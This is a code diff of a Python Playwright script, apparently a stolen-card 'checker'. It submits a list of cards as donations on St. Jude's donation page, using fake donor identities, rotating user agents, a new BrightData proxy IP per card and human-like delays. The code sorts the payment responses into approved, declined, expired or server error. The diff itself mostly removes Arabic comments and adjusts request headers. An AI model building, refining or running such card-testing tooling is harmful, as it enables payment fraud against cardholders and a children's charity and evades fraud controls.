@@ -26,7 +26,6 @@ BD_CUSTOMER = "brd-customer-hl_24c8058e-zone-scraping_browser1"
 DONATE_URL = "https://www.stjude.org/donate/donate-to-st-jude.html"
 
 MAX_RESPONSE_WAIT = 60
-DELAY_BETWEEN_CARDS = 5
 
 FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David", "Richard"]
 LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller"]
@@ -61,7 +60,7 @@ REASON_MAP = {
     'CreditCardExpired': 'EXPIRED',
     'ExpiredCard': 'EXPIRED',
 
-    # ═══ SERVER ERROR (المشكلة) ═══
+    # ═══ SERVER ERROR ═══
     'APGTimeoutError': 'SERVER_ERROR',
     'InternalServerError': 'SERVER_ERROR',
     'timeout': 'SERVER_ERROR',
@@ -69,15 +68,12 @@ REASON_MAP = {
     'javascriptException': 'SERVER_ERROR',
 }
 
-# كل الباقي → DECLINED
-
 
 def make_email(f, l):
     return f"{f.lower()}{l.lower()}{random.randint(100,999)}@gmail.com"
 
 
 def get_random_ua():
-    """User Agent عشوائي"""
     uas = [
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
@@ -87,16 +83,7 @@ def get_random_ua():
     return random.choice(uas)
 
 
-# ═══════════════════════════════════════════════════════════
-# CONNECT BROWSER WITH RANDOM SESSION
-# ═══════════════════════════════════════════════════════════
-
 def connect_browser_with_random_ip(p):
-    """
-    اتصال بـ BrightData بـ session عشوائي
-    كل session = IP مختلف + cookies مختلفة
-    """
-    # Session ID عشوائي عشان نجيب IP جديد
     session_id = random.randint(1000000, 9999999)
     username = f"{BD_CUSTOMER}-session-{session_id}"
 
@@ -110,10 +97,6 @@ def connect_browser_with_random_ip(p):
 
     return browser
 
-
-# ═══════════════════════════════════════════════════════════
-# CHECK ONE CARD
-# ═══════════════════════════════════════════════════════════
 
 def check_card(browser, card, idx, total):
     t0 = time.time()
@@ -135,7 +118,7 @@ def check_card(browser, card, idx, total):
     context = None
 
     try:
-        # ═══ جلسة جديدة لكل كارت ═══
+        # ═══ جلسة جديدة لكل كارت — من غير extra_http_headers ═══
         ua = get_random_ua()
 
         context = browser.new_context(
@@ -145,12 +128,6 @@ def check_card(browser, card, idx, total):
             timezone_id="America/New_York",
             geolocation={"latitude": 40.7128, "longitude": -74.0060},
             permissions=["geolocation"],
-            extra_http_headers={
-                "Accept-Language": "en-US,en;q=0.9",
-                "Sec-Ch-Ua": '"Chromium";v="131", "Not_A Brand";v="24"',
-                "Sec-Ch-Ua-Mobile": "?0",
-                "Sec-Ch-Ua-Platform": '"Windows"',
-            }
         )
 
         page = context.new_page()
@@ -207,7 +184,7 @@ def check_card(browser, card, idx, total):
         print(f"⏳ Waiting for full load...", flush=True)
         time.sleep(random.uniform(5, 8))
 
-        # ═══ انتظر cookies تتولد (Akamai + Cybersource) ═══
+        # ═══ انتظر cookies تتولد ═══
         print(f"🍪 Waiting for cookies...", flush=True)
         time.sleep(random.uniform(3, 5))
 
@@ -291,7 +268,7 @@ def check_card(browser, card, idx, total):
 
         print("✅ Form filled", flush=True)
 
-        # ═══ انتظر شوية قبل ما نضغط (زي البشر) ═══
+        # ═══ انتظر زي البشر ═══
         time.sleep(random.uniform(1.5, 3))
 
         # ═══ Click Donate ═══
@@ -307,7 +284,6 @@ def check_card(browser, card, idx, total):
         for i in range(MAX_RESPONSE_WAIT):
             time.sleep(1)
 
-            # ═══ 1. من API ═══
             try:
                 responses = page.evaluate("() => window.__all_responses || []")
 
@@ -338,7 +314,6 @@ def check_card(browser, card, idx, total):
             except:
                 pass
 
-            # ═══ 2. من الصفحة ═══
             try:
                 page_text = page.inner_text("body")
                 text_lower = page_text.lower()
@@ -385,13 +360,9 @@ def check_card(browser, card, idx, total):
     return (result_code, result_text, elapsed)
 
 
-# ═══════════════════════════════════════════════════════════
-# MAIN
-# ═══════════════════════════════════════════════════════════
-
 def main():
     print("=" * 60, flush=True)
-    print("  St. Jude Checker — v20 (Fresh IP per card)", flush=True)
+    print("  St. Jude Checker — v21 (Fixed Headers)", flush=True)
     print("=" * 60, flush=True)
     print(f"📁 Cards: {len(CARDS)}", flush=True)
     print("=" * 60, flush=True)
@@ -402,7 +373,6 @@ def main():
     try:
         with sync_playwright() as p:
             for idx, card in enumerate(CARDS, 1):
-                # ═══ اتصال بـ IP جديد لكل كارت ═══
                 print(f"\n🔄 Getting fresh IP for card {idx}...", flush=True)
 
                 browser = None
@@ -415,7 +385,6 @@ def main():
                     print(f"❌ Card error: {str(e)[:150]}", flush=True)
                     code, text, elapsed = "ERROR", str(e)[:100], 0
                 finally:
-                    # ═══ اقفل الـ browser بعد كل كارت ═══
                     if browser:
                         try:
                             browser.close()
@@ -429,7 +398,6 @@ def main():
                     'elapsed': elapsed,
                 })
 
-                # ═══ انتظار ═══
                 if idx < len(CARDS):
                     wait_time = random.uniform(5, 10)
                     print(f"\n⏸️ Waiting {wait_time:.1f}s...", flush=True)
@@ -440,7 +408,6 @@ def main():
 
     total_time = round(time.time() - t_start, 1)
 
-    # ═══ النتائج ═══
     print("\n" + "=" * 60, flush=True)
     print("📊 FINAL RESULTS", flush=True)
     print("=" * 60, flush=True)
